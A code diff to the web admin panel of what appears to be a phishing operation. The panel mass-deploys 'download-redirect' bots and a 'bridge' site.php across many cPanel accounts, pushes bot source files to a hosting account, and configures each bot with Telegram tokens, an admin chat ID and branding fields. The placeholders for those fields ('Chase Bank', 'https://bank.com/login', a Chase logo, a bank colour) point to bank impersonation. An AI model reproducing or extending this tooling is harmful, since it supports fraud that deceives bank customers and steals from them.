@@ -164,6 +164,7 @@
         <button id="ov-refresh" class="sm ghost" style="margin:0">↺ Refresh</button>
         <button id="ov-deploy-all" class="sm" style="margin:0">🚀 Deploy to all</button>
         <button id="ov-update-all" class="sm ghost" style="margin:0">⬆ Update all bots</button>
+        <button id="ov-update-source" class="sm ghost" style="margin:0;display:none">📦 Update bot-source</button>
       </div>
     </div>
     <div style="margin-bottom:12px">
@@ -242,7 +243,7 @@
     <div id="stab-botcontrol" class="hidden">
       <div class="card">
         <h2>🤖 Bot Control</h2>
-        <p class="hint">Deploy the download-redirect bot to this cPanel, configure Telegram tokens, and access the bot dashboard in one click — no second login needed.</p>
+        <p class="hint">Deploy the download-redirect bot to this cPanel, configure tokens and settings, and access the bot dashboard in one click.</p>
 
         <div style="margin-bottom:18px;padding:14px;background:rgba(0,212,255,0.04);border:1px solid rgba(0,212,255,0.15);border-radius:12px">
           <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">
@@ -267,6 +268,25 @@
             <div><label>Visits Bot Token</label><input id="bc-vis-token" placeholder="bot token…" autocomplete="off" spellcheck="false"/></div>
           </div>
           <button id="bc-save-tokens" class="sm" style="margin-top:10px">💾 Save Tokens</button>
+        </div>
+
+        <div id="bc-config-section" class="hidden" style="border-top:1px solid var(--line);padding-top:16px;margin-top:16px">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+            <div style="font-weight:700;font-size:13px">Bot Settings</div>
+            <button id="bc-save-config" class="sm" style="margin:0">💾 Save Config</button>
+          </div>
+          <div class="row">
+            <div><label>Site URL</label><input id="bc-cfg-site-url" placeholder="https://yourdomain.com" autocomplete="off" spellcheck="false"/></div>
+            <div><label>Redirect Link (empty = use Site URL)</label><input id="bc-cfg-redirect" placeholder="https://bank.com/login" autocomplete="off" spellcheck="false"/></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div><label>Org Name (mobile page title)</label><input id="bc-cfg-bot-name" placeholder="Chase Bank" autocomplete="off" spellcheck="false"/></div>
+            <div><label>Admin Chat ID</label><input id="bc-cfg-admin-id" placeholder="123456789" inputmode="numeric" autocomplete="off"/></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div><label>Mobile Logo URL</label><input id="bc-cfg-logo" placeholder="https://logo.clearbit.com/chase.com" autocomplete="off" spellcheck="false"/></div>
+            <div><label>Mobile Color (hex)</label><input id="bc-cfg-color" placeholder="#003087" autocomplete="off" spellcheck="false" maxlength="7"/></div>
+          </div>
         </div>
 
         <div id="bc-note" class="log hidden" style="margin-top:14px"></div>
@@ -391,6 +411,7 @@ function showApp(){
   $("#login").classList.add("hidden");$("#app").classList.remove("hidden");
   $("#who").textContent=ME?(ME.name+" · "+ME.chatId+" · "+ME.role):"";
   const isAdmin=ME&&(ME.role==="admin"||ME.role==="superadmin");
+  const isSuper=ME&&ME.role==="superadmin";
   if(isAdmin){
     $("#tab-btn-create").classList.remove("hidden");
     $("#tab-btn-users").classList.remove("hidden");
@@ -403,6 +424,7 @@ function showApp(){
   } else {
     loadSites();
   }
+  if(isSuper) $("#ov-update-source").style.display="";
   fetch(API("status")).then(r=>r.json()).then(s=>{$("#s-whm").className="dot "+(s.whm?"up":"down");$("#s-cf").className="dot "+(s.cloudflare?"up":"down");});
 }
 $("#logout").onclick=async()=>{await fetch(API("logout"),{method:"POST"});location.reload();};
@@ -528,9 +550,9 @@ $("#ov-deploy-all").onclick=async()=>{
   const btn=$("#ov-deploy-all");btn.disabled=true;const old=btn.textContent;btn.textContent="Deploying…";
   let ok=0,fail=0;
   for(const a of pending){
-    log.innerHTML+=`<span>Deploying to ${esc(a.domain)}…</span>\n`;log.scrollTop=log.scrollHeight;
-    try{const d=await (await fetch(API("deploy_bot"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:a.user,domain:a.domain})})).json();
-      if(d.ok){ok++;log.innerHTML+=`<span class="ok">  ✓ ${esc(a.domain)} — ${d.deployed.length} files\n</span>`;}
+    log.innerHTML+=`<span>Deploying bridge to ${esc(a.domain)}…</span>\n`;log.scrollTop=log.scrollHeight;
+    try{const d=await (await fetch(API("deploy_bridge"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:a.user,domain:a.domain})})).json();
+      if(d.ok){ok++;log.innerHTML+=`<span class="ok">  ✓ ${esc(a.domain)} — bridge deployed\n</span>`;}
       else{fail++;log.innerHTML+=`<span class="err">  ✗ ${esc(a.domain)}: ${esc(d.error||"failed")}\n</span>`;}
     }catch(e){fail++;log.innerHTML+=`<span class="err">  ✗ ${esc(a.domain)}: ${esc(e.message)}\n</span>`;}
     log.scrollTop=log.scrollHeight;
@@ -543,13 +565,13 @@ $("#ov-deploy-all").onclick=async()=>{
 $("#ov-update-all").onclick=async()=>{
   const withBot=OV_ITEMS.filter(x=>x.botDeployed&&!x.suspended);
   if(!withBot.length){alert("No deployed bots to update.");return;}
-  if(!confirm(`Update bot on ${withBot.length} cPanel(s)?`))return;
+  if(!confirm(`Re-deploy bridge to ${withBot.length} cPanel(s)? This refreshes site.php on each cPanel.`))return;
   const log=$("#ov-bulk-log");log.classList.remove("hidden");log.innerHTML="";
   const btn=$("#ov-update-all");btn.disabled=true;const old=btn.textContent;btn.textContent="Updating…";
   let ok=0,fail=0;
   for(const a of withBot){
     log.innerHTML+=`<span>Updating ${esc(a.domain)}…</span>\n`;log.scrollTop=log.scrollHeight;
-    try{const d=await (await fetch(API("deploy_bot"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:a.user,domain:a.domain})})).json();
+    try{const d=await (await fetch(API("deploy_bridge"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:a.user,domain:a.domain})})).json();
       if(d.ok){ok++;log.innerHTML+=`<span class="ok">  ✓ ${esc(a.domain)}\n</span>`;}
       else{fail++;log.innerHTML+=`<span class="err">  ✗ ${esc(a.domain)}: ${esc(d.error||"failed")}\n</span>`;}
     }catch(e){fail++;log.innerHTML+=`<span class="err">  ✗ ${esc(a.domain)}: ${esc(e.message)}\n</span>`;}
@@ -1042,11 +1064,13 @@ async function loadBotControl(){
   const domain=CURRENT.domain;
   statusPill.className="pill";statusPill.textContent="Checking…";statusText.textContent="Probing "+domain+"…";
 
-  // Server-side status check (avoids CORS issues with HEAD/no-cors)
+  // Server-side status check
   try{
     const r=await (await fetch(API("bot_status_check")+"&cpanelUser="+encodeURIComponent(CURRENT.user)+"&domain="+encodeURIComponent(domain))).json();
     if(r.deployed){
-      statusPill.className="pill on";statusPill.textContent="Deployed";statusText.textContent="Bot at "+domain+"/admin-dashboard.php";
+      const bridgeLbl=r.bridge?" (bridge mode)":"";
+      statusPill.className="pill on";statusPill.textContent="Deployed";
+      statusText.textContent="Bot active — "+domain+bridgeLbl;
     }else{
       statusPill.className="pill off";statusPill.textContent="Not deployed";statusText.textContent="No bot found — use Deploy button below";
     }
@@ -1054,12 +1078,28 @@ async function loadBotControl(){
     statusPill.className="pill off";statusPill.textContent="Not deployed";statusText.textContent="Status check failed";
   }
 
-  // Load saved tokens
+  // Load saved tokens (classic: bot_config_get via WHM)
   try{
-    const d=await (await fetch(API("bot_config_get")+"&domain="+encodeURIComponent(domain))).json();
+    const d=await (await fetch(API("bot_config_get")+"&cpanelUser="+encodeURIComponent(CURRENT.user)+"&domain="+encodeURIComponent(domain))).json();
     if(d.ok){
       $("#bc-ctrl-token").value=d.control_token||"";
       $("#bc-vis-token").value=d.visits_token||"";
+    }
+  }catch(_){}
+
+  // Load full config via bot_proxy → config_get (bridge mode only)
+  try{
+    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({cpanelUser:CURRENT.user,domain,subaction:"config_get"})})).json();
+    if(d.ok&&d.config){
+      const c=d.config;
+      $("#bc-cfg-site-url").value  = c.site_url||"";
+      $("#bc-cfg-redirect").value  = c.redirect_link||"";
+      $("#bc-cfg-bot-name").value  = c.bot_name||"";
+      $("#bc-cfg-admin-id").value  = c.admin_chat_id||"";
+      $("#bc-cfg-logo").value      = c.mobile_logo||"";
+      $("#bc-cfg-color").value     = c.mobile_color||"";
+      $("#bc-config-section").classList.remove("hidden");
     }
   }catch(_){}
 }
@@ -1113,6 +1153,45 @@ $("#bc-save-tokens").onclick=async()=>{
     if(d.ok) bcNote("✓ Tokens saved. "+esc(d.note||""),"ok");
     else bcNote("✗ "+esc(d.error),"err");
   }catch(e){bcNote("✗ "+esc(e.message),"err");}
+};
+
+$("#bc-save-config").onclick=async()=>{
+  const b=$("#bc-save-config");b.disabled=true;const old=b.textContent;b.textContent="Saving…";
+  const payload={
+    site_url:     $("#bc-cfg-site-url").value.trim(),
+    redirect_link:$("#bc-cfg-redirect").value.trim(),
+    bot_name:     $("#bc-cfg-bot-name").value.trim(),
+    admin_chat_id:$("#bc-cfg-admin-id").value.trim(),
+    mobile_logo:  $("#bc-cfg-logo").value.trim(),
+    mobile_color: $("#bc-cfg-color").value.trim(),
+  };
+  try{
+    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"config_save",...payload})})).json();
+    if(d.ok) bcNote("✓ Config saved.","ok");
+    else bcNote("✗ "+esc(d.error||d.msg||"Failed"),"err");
+  }catch(e){bcNote("✗ "+esc(e.message),"err");}
+  b.disabled=false;b.textContent=old;
+};
+
+// Update bot-source: push all local bot-source files to panelcou1999 (superadmin only)
+const ovSrcBtn=$("#ov-update-source");
+ovSrcBtn.onclick=async()=>{
+  if(!confirm("Push all local bot-source files to panelcou1999/public_html/bot-source?\nThis updates what gets deployed to new cPanels."))return;
+  const log=$("#ov-bulk-log");log.classList.remove("hidden");log.innerHTML="";
+  ovSrcBtn.disabled=true;const old=ovSrcBtn.textContent;ovSrcBtn.textContent="Uploading…";
+  try{
+    log.innerHTML+="<span>Uploading bot-source files to panelcou1999…</span>\n";
+    const d=await (await fetch(API("update_bot_source_bulk"),{method:"POST",headers:{"Content-Type":"application/json"},body:"{}"})).json();
+    if(d.ok){
+      log.innerHTML+=`<span class="done">DONE — ${d.uploaded} files uploaded.</span>\n`;
+    }else{
+      log.innerHTML+=`<span class="warn">Partial — ${d.uploaded} OK, ${d.failed} failed.</span>\n`;
+      (d.results||[]).filter(r=>!r.ok).forEach(r=>{log.innerHTML+=`<span class="err">  ✗ ${esc(r.file)}: ${esc(r.error)}</span>\n`;});
+    }
+  }catch(e){log.innerHTML+=`<span class="err">✗ ${esc(e.message)}</span>\n`;}
+  log.scrollTop=log.scrollHeight;
+  ovSrcBtn.disabled=false;ovSrcBtn.textContent=old;
 };
 
 </script>
